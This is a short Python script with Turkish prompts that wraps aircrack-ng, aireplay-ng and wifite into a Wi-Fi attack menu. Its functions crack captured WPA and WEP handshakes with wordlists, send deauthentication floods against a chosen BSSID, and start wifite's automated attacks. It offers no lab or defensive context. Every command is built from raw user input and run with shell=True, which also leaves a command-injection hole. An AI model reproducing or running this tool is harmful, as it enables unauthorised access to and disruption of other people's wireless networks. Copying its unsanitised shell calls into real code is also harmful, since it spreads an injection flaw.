import subprocess

def wpa_crack():
    cap = input("Handshake dosyasını gir: ")
    wordlist = input("Wordlist dosyasını gir: ")
    bssid = input("Hedef BSSID gir: ")
    komut = f"aircrack-ng -w {wordlist} -b {bssid} {cap}"
    subprocess.run(komut, shell=True)

def wep_crack():
    cap = input("Capture dosyasını gir: ")
    bssid = input("Hedef BSSID gir: ")
    komut = f"aircrack-ng -a1 -b {bssid} {cap}"
    subprocess.run(komut, shell=True)

def capture_handshake():
    interface = input("Monitör modundaki arayüzü gir: ")
    bssid = input("Hedef BSSID: ")
    channel = input("Kanal numarasını gir: ")
    print(f"airodump-ng --bssid {bssid} -c {channel} {interface} komutunu ayrı terminalde çalıştır")
    deauth_count = input("Göndermek istediğin deauth paketi sayısı: ")
    komut = f"aireplay-ng --deauth {deauth_count} -a {bssid} {interface}"
    subprocess.run(komut, shell=True)

def deauth():
    interface = input("Monitör modundaki arayüz: ")
    bssid = input("Hedef BSSID: ")
    paket_sayisi = input("Gönderilecek paket sayısı: ")
    komut = f"aireplay-ng --deauth {paket_sayisi} -a {bssid} {interface}"
    subprocess.run(komut, shell=True)

def auto_attack():
    subprocess.run("wifite", shell=True)




